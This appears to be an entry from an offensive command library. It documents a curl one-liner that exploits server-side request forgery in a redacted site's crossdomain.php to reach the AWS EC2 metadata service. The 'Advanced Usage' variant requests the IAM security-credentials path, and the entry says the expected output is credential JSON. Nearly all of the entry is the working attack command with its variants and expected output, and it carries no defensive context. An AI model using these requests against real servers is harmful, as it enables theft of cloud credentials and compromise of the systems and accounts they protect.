---
id: cmd-curl-ssrf-metadata
data: >-
  curl
  "http://www.███████/crossdomain.php?url=http://169.254.169.254/latest/meta-data/"
  -v
tags:
  - ssrf
  - aws
  - metadata
type: command
output: |-
  ami-id
  reservation-id
  instance-id
  ...
executor: bash
platforms:
  - Linux
  - Web
  - AWS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.692Z'
verified: false
validated: true
submitted: true
---
# curl-ssrf-metadata

## Command

```bash
curl "http://www.███████/crossdomain.php?url=http://169.254.169.254/latest/meta-data/" -v
```

## Description

Exploits SSRF to fetch AWS EC2 metadata, revealing instance details through server-side request.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | Internal metadata endpoint | Yes |
| `-v` | Verbose for response analysis | No |

## Examples

### Basic Usage

```bash
curl "http://www.███████/crossdomain.php?url=http://169.254.169.254/latest/meta-data/"
```

### Advanced Usage

```bash
curl "http://www.███████/crossdomain.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" --max-time 10
```

## Expected Output

List of metadata keys or credential JSON.

## Related

- [[Related Procedure|procedures/Exploit-SSRF-for-AWS-EC2-Metadata-Access]]
